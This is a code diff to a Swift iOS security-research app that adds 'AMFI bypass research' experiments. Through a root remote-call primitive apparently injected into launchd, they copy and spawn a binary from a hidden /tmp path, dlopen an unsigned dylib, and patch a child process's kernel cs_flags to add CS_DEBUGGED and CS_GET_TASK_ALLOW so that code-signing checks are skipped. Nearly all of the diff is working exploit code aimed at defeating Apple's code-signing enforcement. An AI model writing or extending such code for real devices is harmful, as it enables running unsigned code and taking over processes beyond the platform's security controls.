@@ -231,6 +231,22 @@ struct AMFIExperimentView: View {
             let exp21 = self.expScanCryptexLibexec(rc: rc)
             experimentResults.append(exp21)
             
+            // ============================================
+            // AMFI BYPASS RESEARCH
+            // ============================================
+            
+            // Experiment 22: Write binary + try spawn (test AMFI on new file)
+            let exp22 = self.expWriteAndSpawn(rc: rc)
+            experimentResults.append(exp22)
+            
+            // Experiment 23: dlopen unsigned dylib in launchd
+            let exp23 = self.expDlopen(rc: rc)
+            experimentResults.append(exp23)
+            
+            // Experiment 24: Check AMFI-related kernel state
+            let exp24 = self.expAMFIState(rc: rc)
+            experimentResults.append(exp24)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -1130,6 +1146,187 @@ struct AMFIExperimentView: View {
             detail: detail,
             timestamp: Date()
         )
+    }
+    
+    // MARK: - AMFI Bypass Research Experiments
+    
+    /// Write a minimal Mach-O binary to /tmp and try to spawn it
+    /// Tests: does AMFI check signature on newly written files?
+    private func expWriteAndSpawn(rc: RemoteCall) -> ExperimentResult {
+        let mem = rc.trojanMem
+        let testBin = "/tmp/.dsp_test_bin"
+        let pathAddr = remote_alloc_str(rc, testBin)
+        
+        // Write minimal ARM64 binary that just exits
+        // This is a valid Mach-O that calls exit(42)
+        // mov x0, #42; mov x16, #1; svc #0x80
+        let shellcode: [UInt8] = [
+            // Mach-O header (minimal)
+            0xCF, 0xFA, 0xED, 0xFE, // magic: MH_MAGIC_64
+            0x0C, 0x00, 0x00, 0x01, // cputype: ARM64
+            0x00, 0x00, 0x00, 0x00, // cpusubtype
+            0x02, 0x00, 0x00, 0x00, // filetype: MH_EXECUTE
+        ]
+        // Actually, writing a proper Mach-O is complex. Instead, just copy
+        // an existing binary and try to spawn the copy.
+        
+        // Strategy: copy /bin/df to /tmp/test_bin, then spawn the copy
+        // If copy can be spawned → AMFI doesn't check path, only signature!
+        
+        // Step 1: Read /bin/df
+        let srcAddr = remote_alloc_str(rc, "/bin/df")
+        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
+        
+        guard srcFd != UInt64(bitPattern: -1) else {
+            RootExecutor.rcall(rc, "free", pathAddr)
+            RootExecutor.rcall(rc, "free", srcAddr)
+            return ExperimentResult(name: "write+spawn", success: false, detail: "Cannot open /bin/df", timestamp: Date())
+        }
+        
+        // Step 2: Create destination
+        let dstFd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        guard dstFd != UInt64(bitPattern: -1) else {
+            RootExecutor.rcall(rc, "close", srcFd)
+            RootExecutor.rcall(rc, "free", pathAddr)
+            RootExecutor.rcall(rc, "free", srcAddr)
+            return ExperimentResult(name: "write+spawn", success: false, detail: "Cannot create /tmp/test_bin", timestamp: Date())
+        }
+        
+        // Step 3: Copy in chunks
+        let bufAddr = mem + 0x800
+        var totalCopied: UInt64 = 0
+        for _ in 0..<100 { // max 100 chunks of 2KB = 200KB
+            let n = RootExecutor.rcall(rc, "read", srcFd, bufAddr, 2048)
+            if n == 0 || n > 2048 { break }
+            RootExecutor.rcall(rc, "write", dstFd, bufAddr, n)
+            totalCopied += n
+        }
+        
+        RootExecutor.rcall(rc, "close", srcFd)
+        RootExecutor.rcall(rc, "close", dstFd)
+        RootExecutor.rcall(rc, "free", srcAddr)
+        
+        // Step 4: chmod +x
+        RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
+        
+        // Step 5: Try to spawn the COPY
+        let argvBase = mem + 0x400
+        rc[argvBase].setValue64(pathAddr)
+        rc[argvBase + 8].setValue64(0)
+        let pidAddr = mem + 0x2E0
+        rc[pidAddr].setValue64(0)
+        
+        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argvBase, 0)
+        let pid = rc[pidAddr].value32()
+        
+        // Cleanup
+        if ret == 0 && pid != 0 {
+            RootExecutor.rcall(rc, "kill", UInt64(pid), 9)
+        }
+        // Wait for any child
+        RootExecutor.rcall(rc, "usleep", 500000)
+        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
+        
+        RootExecutor.rcall(rc, "unlink", pathAddr)
+        RootExecutor.rcall(rc, "free", pathAddr)
+        
+        let detail = """
+        Copied /bin/df to /tmp (\(totalCopied) bytes)
+        posix_spawn(/tmp/copy): ret=\(ret), pid=\(pid)
+        waitpid: \(waitRet)
+        
+        ret=0 → AMFI accepts copied binaries! (signature travels with file)
+        ret≠0 → AMFI checks path or re-validates signature
+        """
+        
+        return ExperimentResult(name: "copy+spawn binary", success: ret == 0, detail: detail, timestamp: Date())
+    }
+    
+    /// Try dlopen of unsigned dylib in launchd context
+    private func expDlopen(rc: RemoteCall) -> ExperimentResult {
+        // Try loading a system dylib first (should work)
+        let sysLib = remote_alloc_str(rc, "/usr/lib/libSystem.B.dylib")
+        let sysHandle = RootExecutor.rcall(rc, "dlopen", sysLib, 1) // RTLD_LAZY=1
+        RootExecutor.rcall(rc, "free", sysLib)
+        
+        // Try loading from cryptex
+        let cryptexLib = remote_alloc_str(rc, "/private/preboot/Cryptexes/OS/usr/lib/libstdc++.dylib")
+        let cryptexHandle = RootExecutor.rcall(rc, "dlopen", cryptexLib, 1)
+        RootExecutor.rcall(rc, "free", cryptexLib)
+        
+        // Write a minimal dylib to /tmp and try to load it
+        // For now just test if dlopen works at all
+        let fakeLib = remote_alloc_str(rc, "/tmp/.dsp_fake.dylib")
+        // Create empty file
+        let fd = RootExecutor.rcall(rc, "open", fakeLib, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+        if fd != UInt64(bitPattern: -1) { RootExecutor.rcall(rc, "close", fd) }
+        let fakeHandle = RootExecutor.rcall(rc, "dlopen", fakeLib, 1)
+        
+        // Get dlerror
+        let errPtr = RootExecutor.rcall(rc, "dlerror")
+        var errStr = "(no error)"
+        if errPtr != 0 {
+            var errBuf = [UInt8](repeating: 0, count: 200)
+            rc.remoteRead(errPtr, to: &errBuf, size: 200)
+            errStr = String(cString: errBuf + [0])
+        }
+        
+        RootExecutor.rcall(rc, "unlink", fakeLib)
+        RootExecutor.rcall(rc, "free", fakeLib)
+        
+        let detail = """
+        dlopen(/usr/lib/libSystem.B.dylib): \(sysHandle != 0 ? "✅ 0x\(String(format: "%llx", sysHandle))" : "❌ NULL")
+        dlopen(cryptex libstdc++): \(cryptexHandle != 0 ? "✅ 0x\(String(format: "%llx", cryptexHandle))" : "❌ NULL")
+        dlopen(/tmp/fake.dylib): \(fakeHandle != 0 ? "✅ 0x\(String(format: "%llx", fakeHandle))" : "❌ NULL")
+        dlerror: \(errStr.prefix(100))
+        
+        If system dylib loads → dlopen works in launchd
+        If fake dylib loads → AMFI doesn't check dlopen! (huge!)
+        """
+        
+        return ExperimentResult(name: "dlopen test", success: sysHandle != 0, detail: detail, timestamp: Date())
+    }
+    
+    /// Check AMFI-related state: amfi boot-args, proc flags, etc
+    private func expAMFIState(rc: RemoteCall) -> ExperimentResult {
+        // Check if amfi_get_out_of_my_way is set (boot-arg)
+        // Read our proc's cs_flags
+        let pid = RootExecutor.rcall(rc, "getpid")
+        let csflags = mgr.readCSFlags(pid: Int32(pid))
+        
+        // Check if we can modify cs_flags of a child process
+        // Fork a child, then try to patch its cs_flags via kernel
+        let childPid = RootExecutor.rcall(rc, "fork")
+        var childCSFlags: UInt32 = 0
+        var patchResult = "not attempted"
+        
+        if childPid != 0 && childPid != UInt64(bitPattern: -1) {
+            // Read child's cs_flags
+            childCSFlags = mgr.readCSFlags(pid: Int32(childPid))
+            
+            // Try to patch child's cs_flags to add CS_DEBUGGED | CS_GET_TASK_ALLOW
+            let newFlags: UInt32 = childCSFlags | 0x0000800 | 0x0004000 // CS_DEBUGGED | CS_GET_TASK_ALLOW
+            let patchOk = mgr.patchCSFlags(pid: Int32(childPid), addFlags: 0x0000800 | 0x0004000)
+            patchResult = patchOk.ok ? "✅ patched!" : "❌ \(patchOk.msg)"
+            
+            // Read back
+            let afterFlags = mgr.readCSFlags(pid: Int32(childPid))
+            patchResult += " (before=0x\(String(format: "%x", childCSFlags)), after=0x\(String(format: "%x", afterFlags)))"
+            
+            // Kill child
+            RootExecutor.rcall(rc, "kill", childPid, 9)
+            RootExecutor.rcall(rc, "waitpid", childPid, rc.trojanMem + 0x380, 0)
+        }
+        
+        let detail = """
+        launchd (PID \(pid)) cs_flags: 0x\(String(format: "%x", csflags))
+        child cs_flags patch: \(patchResult)
+        
+        If cs_flags patchable → can mark process as CS_DEBUGGED
+        CS_DEBUGGED skips some AMFI checks!
+        """
+        
+        return ExperimentResult(name: "AMFI state + cs_flags patch", success: patchResult.contains("✅"), detail: detail, timestamp: Date())
     }
     #endif
 }
